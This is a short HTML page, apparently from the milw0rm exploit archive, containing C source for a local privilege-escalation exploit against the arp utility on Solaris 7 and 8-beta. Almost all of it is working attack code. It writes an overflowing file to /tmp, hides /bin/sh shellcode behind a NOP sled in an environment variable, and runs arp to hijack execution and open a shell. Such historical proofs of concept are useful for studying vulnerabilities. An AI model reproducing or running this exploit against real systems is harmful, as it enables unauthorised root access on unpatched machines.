<html><head><title>Solaris 7 / 8-beta arp Local Overflow Exploit</title></head><pre>/*
   arp overflow proof of concept by ahmed@securityfocus.com
   shellcode originally written by Cheez Whiz.

                              tested on x86 solaris 7,8beta
   default should work.  if not, arg1 = offset. +- by 100's

   Copyright Security-Focus.com, 11/2000
*/

long get_esp() { __asm__(&quot;movl %esp,%eax&quot;); }

int main(int ac, char **av)
{
  char shell[] =
    &quot;\xeb\x45\x9a\xff\xff\xff\xff\x07\xff&quot;
    &quot;\xc3\x5e\x31\xc0\x89\x46\xb7\x88\x46&quot;
    &quot;\xbc\x88\x46\x07\x89\x46\x0c\x31\xc0&quot;
    &quot;\xb0\x2f\xe8\xe0\xff\xff\xff\x52\x52&quot;
    &quot;\x31\xc0\xb0\xcb\xe8\xd5\xff\xff\xff&quot;
    &quot;\x83\xc4\x08\x31\xc0\x50\x8d\x5e\x08&quot;
    &quot;\x53\x8d\x1e\x89\x5e\x08\x53\xb0\x3b&quot;
    &quot;\xe8\xbe\xff\xff\xff\x83\xc4\x0c\xe8&quot;
    &quot;\xbe\xff\xff\xff\x2f\x62\x69\x6e\x2f&quot;
    &quot;\x73\x68\xff\xff\xff\xff\xff\xff\xff&quot;
    &quot;\xff\xff&quot;;

  unsigned long magic = 0x8047b78;
  unsigned long r = get_esp() + 600;
  unsigned char buf[300];
  int f;

  if (ac == 2)
    r += atoi(av[1]);

  memset(buf,0x61,sizeof(buf));
  memcpy(buf+52,&amp;magic,4);
  memcpy(buf+76,&amp;r,4);

  f = open(&quot;/tmp/ypx&quot;,O_CREAT|O_WRONLY,0600);
  write(f,&quot;1 2 3 4 &quot;,8);
  write(f,buf,sizeof(buf));
  close(f);

  memset(buf,0x90,sizeof(buf));
  memcpy(buf,&quot;LOL=&quot;,4);
  memcpy(buf+(sizeof(buf)-strlen(shell)),shell,strlen(shell));
  putenv(buf);

  system(&quot;/usr/sbin/arp -f /tmp/ypx&quot;);
  unlink(&quot;/tmp/ypx&quot;);
}


// milw0rm.com [2001-01-15]</pre></html>